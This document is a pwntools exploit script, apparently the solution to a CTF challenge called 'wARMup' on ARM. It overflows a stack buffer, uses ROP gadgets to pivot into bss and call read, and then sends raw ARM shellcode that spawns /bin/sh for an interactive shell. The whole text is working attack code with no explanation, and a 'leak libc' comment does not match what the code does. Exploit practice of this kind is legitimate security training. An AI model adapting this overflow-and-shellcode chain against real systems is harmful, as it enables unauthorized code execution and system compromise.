from pwn import *

context.log_level = "debug"
p = process("./run.sh")

puts_got = 0x00021014
puts_plt = 0x00010394
abort_got = 0x00021024
read_got = 0x0002100C
main = 0x000104F8
blx_r3 = 0x00010450 #bx r3
pop_r3_pc = 0x00010364 # pop {r3, pc}
csu_gadget = 0x000105AC #LDMFD   SP!, {R4-R10,PC} 
csu_gadget2 = 0x0001058C #add r4, r4, #1 ; ldr r3, [r5], #4 ; mov r2, sb ; mov r1, r8 ; mov r0, r7 ; blx r3
read = 0x10530
"""
.text:00010530                 MOV     R2, #0x78
.text:00010534                 MOV     R1, R3          ; buf
.text:00010538                 MOV     R0, #0          ; fd
.text:0001053C                 BL      read
"""

def csu(func_got, r0, r1, r2, next_func):
    s = p32(csu_gadget)+p32(0)+p32(func_got)+p32(1)+p32(r0)+p32(r1)+p32(r2)+p32(0)+p32(csu_gadget2)
    s += p32(0)*7 + p32(next_func)*8
    return s

# leak libc
context.binary = './wARMup'
elf = context.binary
bss = elf.bss()+0x300
payload = "A"*0x64+p32(bss)+p32(pop_r3_pc)+p32(bss)+p32(read)
p.sendlineafter("CTF!", payload)

# getshell
time.sleep(0.5)
shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
payload = p32(bss+4)+shellcode
p.sendline(payload)

p.interactive()
